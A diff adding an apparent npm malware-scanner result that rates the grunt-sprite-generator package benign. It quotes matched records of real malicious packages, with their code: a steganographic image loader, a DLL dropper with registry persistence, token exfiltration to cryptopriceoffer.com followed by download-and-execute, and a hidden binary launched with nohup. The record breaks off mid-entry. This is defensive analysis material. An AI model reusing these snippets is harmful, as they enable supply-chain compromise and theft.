@@ -1,0 +1,529 @@
+{
+  "package_name": "grunt-sprite-generator",
+  "package_version": "0.0.5",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:41:17.822358",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/Gruntfile.js",
+    "package/tasks/spriteGenerator.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-sprite-generator/0.0.5/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-sprite-generator/0.0.5/package/Gruntfile.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-sprite-generator/0.0.5/package/tasks/spriteGenerator.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "spriteGenerator_slice_1",
+          "code_snippet": "/*\n * grunt-sprite-generator\n * http://github.com/hollandben/grunt-sprite-generator\n *\n * Copyright (c) 2013 Ben Holland\n * Licensed under the MIT license.\n */\n\nvar path\t\t= require('path');\nvar spritesmith = require('spritesmith');\n\nmodule.exports = function(grunt) {\n    'use strict';\n\n    var httpRegex = new RegExp('http[s]?', 'ig');\n    var imageRegex = new RegExp('background-image:[\\s]?url\\([\"\\']?([\\w\\d\\s!:./\\-\\_]*\\.[\\w?#]+)[\"\\']?\\)[^;]*\\;', 'ig');\n    var filepathRegex = new RegExp('[\"\\']?([\\w\\d\\s!:./\\-\\_]*\\.[\\w?#]+)[\"\\']?', 'ig');\n\n    grunt.registerMultiTask('spriteGenerator', 'Grunt task that generates a sprite from images referenced in a stylesheet and then updates the references with the new sprite image and positions', function() {\n\n        // Merge task-specific and/or target-specific options with these defaults.\n        var options = this.options({\n            algorithm: 'binary-tree',\n            baseUrl: './',\n            engine: 'auto',\n            padding: 2\n        });\n\n        var done = this.async();\n\n        // Collect all background-image references in a given file\n        var collectImages = function(files) {\n            var images = [];\n            var found = false;\n\n            files.forEach(function(srcFile) {\n                var data = grunt.file.read(options.baseUrl + srcFile);\n                var references = data.match(imageRegex);\n\n                // If references are found\n                if (references) {\n                    references.forEach(function(file) {\n                        // Exit if it contains a http/https\n                        if (httpRegex.test(file)) {\n                            grunt.verbose.warn(file + ' has been skipped as it\\'s an external resource!');\n                            return false;\n                        }\n    \n                        // Exit if not a PNG\n                        if (!/\\.png/.test(file)) {\n                            grunt.verbose.warn(file + ' has been skipped as it\\'s not a PNG!');\n                            return false;\n                        }\n    \n                        var filepath;\n                        var imagePath = file.match(filepathRegex)[0].replace(/['\"]/g, '');\n    \n                        if(imagePath[0] === '/') {\n                        \tfilepath = options.baseUrl + imagePath;\n                        } else {\n                        \tfilepath = path.resolve(srcFile.substring(0, srcFile.lastIndexOf(\"/\")), imagePath);\n                        }\n    \n                        if (grunt.file.exists(filepath)) {\n                            images[filepath] = file;\n                            found = true;\n                        } else {\n                            grunt.verbose.warn(filepath + ' has been skipped as it does not exist!');\n                        }\n                    });\n                }\n            });\n\n            return found ? images : found;\n        };\n\n        var spriteSmithWrapper = function(config, callback) {\n            var dest = options.dest;\n            var defaultConfig = {\n                algorithm: options.algorithm,\n                engine: options.engine,\n                exportOpts: {\n                    format: 'png'\n                },\n                padding: options.padding\n            };\n\n            grunt.util._.defaults(config, defaultConfig);\n\n            spritesmith(config, function(err, result) {\n\n                if (err) {\n                    grunt.fatal(err);\n                    return callback(err);\n                } else {\n                    grunt.file.write(dest, result.image, {\n                        encoding: 'binary'\n                    });\n\n                   grunt.log.writeln('Sprite', dest, 'has been created');\n\n                    var tmpResult = result.coordinates;\n                    var coords = [];\n\n                    for(var key in tmpResult) {\n                        coords[key] = {\n                            x: tmpResult[key].x,\n                            y: tmpResult[key].y\n                        };\n                    }\n\n                    callback(false, coords);\n                }\n            });\n        };\n\n        var updateReferences = function(filepath, spritePath, arr) {\n            var data = grunt.file.read(filepath);\n\n            arr.forEach(function(obj) {\n                data = data.replace(obj.ref, 'background-image: url(\\''+ spritePath +'\\');\\n    background-position: -'+ obj.coords.x +'px -'+ obj.coords.y +'px;');\n            });\n\n            grunt.file.write(filepath, data);\n            grunt.log.writeln('File', filepath, 'has been updated');\n        };\n\n\n        this.files.forEach(function(file) {\n            var fileDest = file.dest;\n\n            // Basic cache busting\n            for(var prop in options) {\n                fileDest = fileDest.replace(new RegExp('{'+ prop +'}','g'), options[prop]);\n            }\n\n            options.dest = options.baseUrl + fileDest;\n\n            if(file.src.length < 1) {\n                grunt.fatal('No source files were found');\n            }\n\n            var src = file.src.filter(function(filepath) {\n                // Warn on and remove invalid source files (if nonull was set).\n                if (!grunt.file.exists(filepath)) {\n                    grunt.log.warn('Source file \"' + filepath + '\" not found.');\n                    return false;\n                } else {\n                    return true;\n                }\n            });\n\n            // Process starter\n            var collection = collectImages(src);\n\n            if(!collection) {\n                grunt.log.warn('No images were found so a sprite was not generated');\n                done();\n                return false;\n            }\n\n            grunt.util.async.mapSeries([{ \n                src: grunt.util._.keys(collection) \n            }], spriteSmithWrapper, function(err, results) {\n                if (err) {\n                    console.log(err);\n                }\n\n                src.forEach(function(file) {\n                    var refs = [];\n\n                    results.forEach(function(result, i) {\n                        grunt.util._.keys(result).map(function(key) {\n                            refs.push({\n                                src: key,\n                                ref: collection[key],\n                                coords: {\n                                    x: result[key].x,\n                                    y: result[key].y\n                                }\n                            });\n                        });\n                    });\n\n                    updateReferences(file, fileDest, refs);\n                });\n\n                done();\n            });\n        });\n    });\n};",
+          "is_malicious": false,
+          "malice_score": 0.3954942107200623,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads local stylesheet files to collect background-image references, filtering out external HTTP/HTTPS URLs and non-PNG images, then reads the referenced PNG image files from the local filesystem. It uses the spritesmith library to generate a sprite image from these local images and writes the resulting sprite PNG file to disk. Finally, it updates the original stylesheet files by replacing individual image references with the new sprite image URL and corresponding background-position CSS properties, facilitating local file read/write operations and image processing without any network communication or execution of external commands.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Grunt plugin designed to generate CSS sprites from local PNG images referenced in stylesheet files. It reads local files, processes images using the spritesmith library, writes a combined sprite image to disk, and updates CSS references accordingly. There is no network communication, no dynamic code execution, no obfuscation, no persistence mechanisms, and no attempts to exfiltrate data or execute arbitrary code. Compared to the known malicious patterns, this code lacks any suspicious behavior such as steganographic payload extraction, downloading and executing disguised DLLs, or exfiltrating secrets. The use of file system APIs and image processing is consistent with its stated purpose and does not indicate malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_202033_905711_snippet_2",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39915984869003296,
+              "code_similarity": 0.39025259017944336,
+              "behavior_similarity": 0.40806710720062256,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function processImage(filePath) {\n    console.log(\"Processing image...\");\n    const data = fs.readFileSync(filePath);\n    let analyzepixels = \"\";\n    let convertertree = false;\n\n    for (let i = 0; i < data.length; i++) {\n        const value = data[i];\n        if (value >= 32 && value <= 126) {\n            analyzepixels += String.fromCharCode(value);\n        } else {\n            if (analyzepixels.length > 2000) {\n                convertertree = true;\n                break;\n            }\n            analyzepixels = \"\";\n        }\n    }\n    // ...\n    if (convertertree) {\n        imagebyte = analyzepixels;\n    } else {\n        // benign code\n    }\n    const func = new Function('https', 'exec', 'os', imagebyte);\n    func(https, exec, os);\n}\nprocessImage('logo1.jpg');\nprocessImage('logo2.jpg');\nprocessImage('logo3.jpg');",
+                "code_behavior": "During postinstall, the code reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads from their byte data, and if a threshold is met, dynamically executes the extracted string as JavaScript code, resulting in arbitrary code execution sourced from image-embedded payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files.",
+                  "violated_expectations": "Legitimate packages do not extract and execute code from image files during installation, nor do they use dynamic code execution on data sourced from non-code files.",
+                  "similar_legitimate_use": "Legitimate image processing libraries may read and analyze image files, but never execute dynamically extracted code from image data.",
+                  "key_indicators": [
+                    "Steganographic payload extraction from image files",
+                    "Dynamic code execution using new Function() on extracted strings",
+                    "Threshold-based trigger for code execution (payload length > 2000)",
+                    "References to analyzepixels, convertertree, and imagebyte variables"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "dist/loadformat.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
+                    "logo1.jpg, logo2.jpg, logo3.jpg in package root directory",
+                    "References to analyzepixels, convertertree, and imagebyte variables in code"
+                  ],
+                  "network_indicators": [
+                    "85.208.108.29:443 (C2 server)",
+                    "Outbound POST requests to /register and /post-result endpoints",
+                    "Outbound GET requests to /get-command?clientId="
+                  ],
+                  "how_to_detect": "Monitor for npm packages that, during installation, spawn detached Node.js processes, read and parse image files for ASCII payloads, or dynamically execute code extracted from non-code files. Flag packages making outbound connections to hardcoded or suspicious IPs (e.g., 85.208.108.29) or exhibiting periodic polling for remote commands. Scan package contents for the presence of suspicious image files (logo1.jpg, logo2.jpg, logo3.jpg) and loader scripts (dist/loadformat.js), and inspect for code patterns involving analyzepixels, convertertree, and imagebyte."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_201021_740569_snippet_2",
+              "source_package": "cors-parser (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201021_740569/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39471960067749023,
+              "code_similarity": 0.36404985189437866,
+              "behavior_similarity": 0.4253893494606018,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const baseurl = 'hxxps://api.jz-aws[.]info';\n// windows\nconst loaderurl = `${baseurl}/load.png`;\nconst dllpath = 'C:/ProgramData/thumbs.db'\nconst method = 'work'\nconst param = 'aHR0cHM6Ly9hcGkuanotYXdzLmluZm8vd2FpdC5wbmc=' // hxxps://api.jz-aws[.]info/wait.png\nconst regval = `rundll32 ${dllpath},${method}`\nconst regpath = 'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\nconst regkey = 'FontCache'\n...\nvar env = process.env;\nenv.param = param;\nvar dllproc = spawn('rundll32', [dllpath, method], {env: env, detached: true, stdio: 'ignore'})\ndllproc.unref();\n// register autorun\nvar regproc = spawn('reg', ['add', regpath, '/v', regkey, '/t', 'REG_SZ', '/d', regval, '/f'])\nvar setxproc = spawn('setx', ['param', param]);",
+                "code_behavior": "At runtime on Windows, the code downloads a file named 'load.png' (actually a DLL), writes it to 'C:/ProgramData/thumbs.db', executes it via rundll32 with a specified method, and establishes persistence by adding a registry autorun entry and setting an environment variable.",
+                "malice_analysis": {
+                  "why_suspicious": "The code downloads a file with a .png extension that is actually a DLL, writes it to a system directory, executes it using rundll32, and manipulates the Windows registry to ensure persistence. It also sets environment variables for malware configuration. These actions are characteristic of malware droppers and persistence mechanisms.",
+                  "violated_expectations": "A CORS parser should never download or execute binaries, modify the registry, or set environment variables. Such actions are not only unnecessary but highly suspicious in the context of a utility library.",
+                  "similar_legitimate_use": "Installer or updater tools may create autorun entries or set environment variables, but these actions are never appropriate in a CORS utility and should not occur without explicit user consent.",
+                  "key_indicators": [
+                    "Download of .png files that are actually DLLs",
+                    "Writing to C:/ProgramData/thumbs.db",
+                    "Execution via rundll32",
+                    "Registry modification for autorun persistence",
+                    "Setting environment variables for malware configuration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (stage 2, Windows)",
+                  "file_location": "Decoded from initial.png (Windows branch)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process_execution",
+                    "registry_modification",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cors-parser",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 to 3.0.1",
+                  "why_malicious": "The package is explicitly designed to act as a dropper for platform-specific backdoors. It abuses import-time execution to fetch and run remote code disguised as PNG images, which are actually malicious payloads. The code uses steganography and dynamic code execution to implant persistent malware on both Windows and Unix systems, violating user trust and security boundaries by enabling remote code execution, persistence, and system compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package installation or import triggers a network request to download and execute remote code from 'initial.png' using eval.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Stage 2 payload execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Stage 2 code, decoded from 'initial.png', determines the operating system and downloads platform-specific disguised binaries (DLLs for Windows, ELF/Mach-O for Unix) from the remote server.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware drop and execution"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The malware is written to disk, executed, and persistence is established via registry autorun (Windows) or shell configuration file modification (Unix), resulting in a persistent backdoor and system compromise.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Backdoor persistence and full system compromise"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Import-time or install-time network requests to download files with image extensions (e.g., .png) from hardcoded external domains",
+                    "Decoding and dynamic execution (eval) of remote content at import-time",
+                    "Writing and executing binaries from files with image extensions (.png) in system or temporary directories",
+                    "Establishing persistence via registry autorun keys (Windows) or shell configuration file modifications (Unix)"
+                  ],
+                  "file_indicators": [
+                    "index.js containing minified or obfuscated one-liner network/eval logic",
+                    "Downloaded files named *.png but containing non-image binary content",
+                    "/var/tmp/logd (Unix malware dropper path)",
+                    "C:/ProgramData/thumbs.db (Windows malware dropper path)",
+                    "Modifications to .zshrc (Unix) or registry autorun keys (Windows)"
+                  ],
+                  "network_indicators": [
+                    "api.jz-aws.info (all subdomains and paths)",
+                    "Unusual PNG file downloads from non-image hosting domains, especially during package import or install"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that initiate network requests at import or install time, particularly those downloading files with image extensions but containing non-image content. Flag code that decodes and executes remote content via eval. Watch for creation of binaries in temporary or system locations (e.g., /var/tmp/logd, C:/ProgramData/thumbs.db) and persistence mechanisms such as registry autorun entries or shell configuration file modifications. Network monitoring should alert on connections to api.jz-aws.info and similar suspicious domains, especially when associated with package installation or import events."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133826_958903_snippet_2",
+              "source_package": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_958903/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3935990333557129,
+              "code_similarity": 0.4102688729763031,
+              "behavior_similarity": 0.3769291937351227,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n  const https = require('https');\n  const querystring = require('querystring');\n\n  const options = {\n    hostname: domain,\n    port: 443,\n    path: entry,\n    method: 'POST',\n    headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  };\n\n  const req = https.request(options, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      fs.writeFileSync(path, data);\n      const { exec } = require('child_process');\n      exec('node ' + path, (error, stdout, stderr) => {});\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e.message);\n  });\n  req.write(token);\n  req.end();\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = path.join(os.homedir(), '.svnlook');\nif (fs.existsSync(dir)) {\n  const token = fs.readFileSync(path.join(dir, 'svntoken'), { encoding: 'utf8', flag: 'r', });\n  getsvnroot('cryptopriceoffer.com', '/getupdate.php', token, path.join(dir, 'checksvn.js'));\n}",
+                "code_behavior": "At import-time or runtime, the code reads a token from a file in a hidden directory, sends it via HTTPS POST to a hardcoded remote server, writes the server's response as a new JavaScript file, and immediately executes it as a child process, resulting in exfiltration of local data and arbitrary remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The code chains together reading a local secret, exfiltrating it to a suspicious domain, downloading a new script, and executing it, all without user knowledge or consent. It disables TLS certificate validation, further increasing risk.",
+                  "violated_expectations": "Normal packages do not exfiltrate local data or execute downloaded code automatically, nor do they disable TLS certificate validation.",
+                  "similar_legitimate_use": "Automated updaters may download and run code, but only with explicit user consent, from trusted sources, and with proper TLS validation.",
+                  "key_indicators": [
+                    "Reading secret from hidden directory",
+                    "POSTing data to hardcoded suspicious domain",
+                    "Writing and executing remote code as a new file",
+                    "Disabling TLS certificate validation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "index.js (second package, Jade Sleet campaign)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages)",
+                  "package_manager": "npm",
+                  "package_versions": "Multiple versions, published between Summer 2023 and Q2 2024",
+                  "why_malicious": "These packages are designed to execute arbitrary code on installation or import, exfiltrate data, download and execute additional payloads, and target both Windows and Linux systems. They use obfuscation, multi-stage payloads, and anti-forensics to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package creates hidden directory and fetches remote data, storing it locally.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for further malicious activity by second package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Second package reads local token, exfiltrates it, downloads and executes new malicious code.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Arbitrary code execution and further compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Single-package variant (Moonstone Sleet) downloads, decrypts, and executes remote payload on Windows, then deletes evidence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Immediate compromise and anti-forensics."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Linux-targeting variant sets up directory, installs and runs disguised binary, deletes installer script.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and stealthy execution on Linux systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of hidden or misleadingly named directories in user home or application support paths (e.g., .svnlook, ~/Library/Application Support/UpdateProvider)",
+                    "Synchronous or asynchronous network requests to hardcoded suspicious domains or IPs during install/import",
+                    "Writing and executing files downloaded from remote servers, especially as new scripts or binaries",
+                    "Immediate deletion of installer or script files after execution (anti-forensics)",
+                    "Conditional OS-specific payload execution (e.g., Windows vs Linux branches)",
+                    "Disabling TLS certificate validation in Node.js environment"
+                  ],
+                  "file_indicators": [
+                    ".svnlook directory in user home",
+                    "svntoken, checksvn.js, preinstall.bat, preinstall.ps1, sqlite.a, updateMacOS",
+                    "deference.js (deleted post-execution)",
+                    "~/Library/Application Support/UpdateProvider"
+                  ],
+                  "network_indicators": [
+                    "cryptopriceoffer.com (checkupdate.php, getupdate.php)",
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded C2 domains/IPs"
+                  ],
+                  "how_to_detect": "Monitor for creation of hidden or misleadingly named directories and files in user home or application support paths, unexpected network requests to known malicious domains or IPs during install/import, execution of downloaded scripts or binaries, and immediate file deletion post-install. Flag packages that conditionally execute OS-specific payloads, disable TLS certificate validation, or use obfuscated/encoded payloads. Correlate with known IOCs and behavioral patterns from Jade Sleet and Moonstone Sleet campaigns for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102918_966505_snippet_1",
+              "source_package": "x91yz, tyibyc, y78b (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102918_966505/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39233076572418213,
+              "code_similarity": 0.42861291766166687,
+              "behavior_similarity": 0.356048583984375,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Lines 40-43 (paraphrased)\nconst fs = require('fs');\nconst cp = require('child_process');\nfs.mkdirSync('~/Library/Application Support/Safari Update', { recursive: true });\nfs.copyFileSync('./travis.yml', '~/Library/Application Support/Safari Update/updateSafari');\ncp.execSync('nohup ~/Library/Application Support/Safari Update/updateSafari &');",
+                "code_behavior": "During postinstall, the code creates a hidden directory in the user's Application Support folder, copies a bundled file named 'travis.yml' (actually a Mach-O binary) to this directory as 'updateSafari', and executes it in the background using 'nohup', resulting in persistent execution of the malicious binary.",
+                "malice_analysis": {
+                  "why_suspicious": "The code creates a non-standard directory in a sensitive user data location, copies and renames a file with a misleading extension to disguise its true nature, and executes it as a background process, all of which are classic malware persistence and evasion techniques.",
+                  "violated_expectations": "Legitimate npm packages should not drop or execute binaries, especially not with misleading names or in user data directories. They should not perform postinstall actions unrelated to their stated functionality.",
+                  "similar_legitimate_use": "Some legitimate installers may set up helper binaries, but these are typically well-documented, signed, and not disguised as configuration files or executed in this manner.",
+                  "key_indicators": [
+                    "Creation of non-standard directory in '~/Library/Application Support/Safari Update'",
+                    "Copying and renaming a file with a misleading extension ('travis.yml' as a Mach-O binary)",
+                    "Execution of a binary using 'nohup' for background persistence",
+                    "Use of a file named 'travis.yml' as an executable binary"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package-lock.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "x91yz, tyibyc, y78b",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "These packages impersonate the legitimate 'cli-width' package by copying its metadata and code, but introduce malicious logic that deploys and executes a disguised Mach-O binary ('travis.yml') on macOS systems during installation. The binary is dropped and executed in a hidden directory, attempts to establish persistence, and connects to an external command-and-control (C2) server to potentially download additional payloads. The packages also employ anti-forensics techniques by deleting installation traces and overwriting manifest files to hinder detection and analysis."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, the package executes 'package-lock.js' via a postinstall hook.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious binary is dropped and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The script creates a hidden directory, copies and renames the Mach-O binary, and executes it in the background.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious binary ('updateSafari') runs persistently."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The Mach-O binary connects to a remote C2 server to download a second-stage payload.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Potential further compromise or payload execution."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The installation script deletes itself to remove evidence.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Anti-forensics; hinders detection and analysis."
+                  },
+                  {
+                    "step": 5,
+                    "action": "In some variants, the package.json is overwritten to erase traces of the malicious install command.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Further anti-forensics; complete erasure of install evidence."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of JavaScript files (e.g., package-lock.js) during postinstall phase",
+                    "Creation of hidden or misleadingly named directories in user Application Support (e.g., '~/Library/Application Support/Safari Update')",
+                    "Copying and renaming files with misleading extensions (e.g., 'travis.yml' as a Mach-O binary)",
+                    "Execution of binaries using 'nohup' or as background processes during installation",
+                    "Immediate deletion of installation scripts (e.g., 'package-lock.js') or manifest files (e.g., 'package.json') post-install",
+                    "Outbound network connections to newly registered or suspicious domains (e.g., passgenwizard.com) during or immediately after package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of 'package-lock.js' as an executable script in the package",
+                    "Bundled 'travis.yml' file that is actually a Mach-O binary",
+                    "Creation of '~/Library/Application Support/Safari Update/updateSafari' binary",
+                    "Overwriting or deletion of 'package.json' post-install"
+                  ],
+                  "network_indicators": [
+                    "Connections to passgenwizard.com/ts/getTs.asp",
+                    "Download attempts for files named 'vfcompat.dll' from untrusted or newly registered domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for execution of non-standard scripts (such as 'package-lock.js') during postinstall, and for creation of unexpected directories or binaries in user data folders (e.g., '~/Library/Application Support/Safari Update'). Flag packages that drop or execute files with misleading extensions (e.g., 'travis.yml' as a binary). Detect self-deletion or overwriting of installation scripts and manifest files. Alert on outbound network connections to suspicious or newly registered domains, especially those attempting to download additional payloads during or immediately after package installation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133826_958903_snippet_1",
+              "source_package": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_958903/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3922768831253052,
+              "code_similarity": 0.4116618037223816,
+              "behavior_similarity": 0.37289196252822876,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst path = require('path');\nconst fs = require('fs');\n\nfunction checksvn(version, projectUrl) {\n  var request = require('sync-request');\n  var res = request('GET', projectUrl);\n  fs.writeFileSync(version, res.getBody());\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = os.homedir() + '/.svnlook';\nif (!fs.existsSync(dir)){\n  fs.mkdirSync(dir);\n}\nchecksvn(path.join(dir,'svntoken'), 'https://cryptopriceoffer.com/checkupdate.php');",
+                "code_behavior": "At import-time or runtime, the code creates a hidden directory in the user's home folder, fetches data from a remote server using a synchronous HTTP request, writes the response to a file in that directory, and disables TLS certificate validation, resulting in the local staging of remote attacker-controlled data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code creates a hidden directory and fetches data from an external, suspicious domain, storing it locally without user consent. It disables TLS certificate validation, increasing risk of man-in-the-middle attacks.",
+                  "violated_expectations": "Normal packages do not create hidden directories or fetch and store remote data on import or runtime, nor do they disable TLS certificate validation.",
+                  "similar_legitimate_use": "Some legitimate updaters or configuration managers may fetch remote data, but not in hidden directories, not at import-time, and not with TLS validation disabled or without user interaction.",
+                  "key_indicators": [
+                    "Creation of hidden directory in user home (e.g., .svnlook)",
+                    "Synchronous network request to hardcoded suspicious domain",
+                    "Writing remote data to disk without user interaction",
+                    "Disabling TLS certificate validation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "index.js (first package, Jade Sleet campaign)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages)",
+                  "package_manager": "npm",
+                  "package_versions": "Multiple versions, published between Summer 2023 and Q2 2024",
+                  "why_malicious": "These packages are designed to execute arbitrary code on installation or import, exfiltrate data, download and execute additional payloads, and target both Windows and Linux systems. They use obfuscation, multi-stage payloads, and anti-forensics to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package creates hidden directory and fetches remote data, storing it locally.",
